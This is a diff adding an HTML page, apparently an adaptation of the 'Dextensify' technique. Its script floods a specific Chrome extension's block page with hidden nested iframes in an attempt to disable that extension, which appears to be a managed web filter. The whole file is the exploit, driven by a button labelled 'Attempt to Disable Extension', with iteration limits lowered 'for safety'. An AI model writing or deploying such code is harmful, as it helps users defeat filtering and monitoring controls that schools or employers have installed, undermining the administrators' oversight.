@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Dextensify Target Specific Extension</title>
+<script>
+function checkAndCreateIframes() {
+    const baseUrl = 'chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html';
+    
+    // Assuming you have some way to check or list URLs you want to target
+    // For demonstration, we use a placeholder for detected URLs
+    const detectedUrls = [baseUrl + '?url=https%3A%2F%2Fwww.instagram.com%2F&category=undefined']; // Example detected URLs
+    
+    const targetUrl = detectedUrls.find(url => url.startsWith(baseUrl));
+    
+    if (targetUrl) {
+        createIframes(targetUrl);
+    } else {
+        document.getElementById("notice").innerHTML = "Target base URL not detected. Operation aborted.";
+    }
+}
+
+function createIframes(targetUrl) {
+    let iframes = [];
+    let iterations = 0;
+
+    function addIframes() {
+        if(iterations >= 5) { // Safety check to prevent too many iterations
+            console.log("Limit reached, stopping to prevent browser crash.");
+            return;
+        }
+
+        let iframe = document.createElement("iframe");
+        iframe.style.display = "none"; // Hide the iframe for a cleaner look
+        document.body.appendChild(iframe);
+        iframes.push(iframe);
+
+        for (let i = 0; i < 10; i++) { // Reduced for safety
+            let subframe = document.createElement("iframe");
+            subframe.src = targetUrl;
+            subframe.style.width = "1px";
+            subframe.style.height = "1px";
+            subframe.style.display = "none"; // Hide subframes as well
+            iframe.contentWindow.document.body.appendChild(subframe);
+        }
+
+        // Remove old iframes to manage memory usage
+        if (iframes.length > 3) {
+            let oldIframe = iframes.shift();
+            oldIframe.parentNode.removeChild(oldIframe);
+        }
+
+        iterations++;
+        setTimeout(addIframes, 1000); // Increased delay for safety and to be less aggressive
+    }
+
+    addIframes();
+}
+</script>
+</head>
+<body>
+
+<button onclick="checkAndCreateIframes()">Attempt to Disable Extension</button>
+<div id="notice"></div>
+
+</body>
+</html>
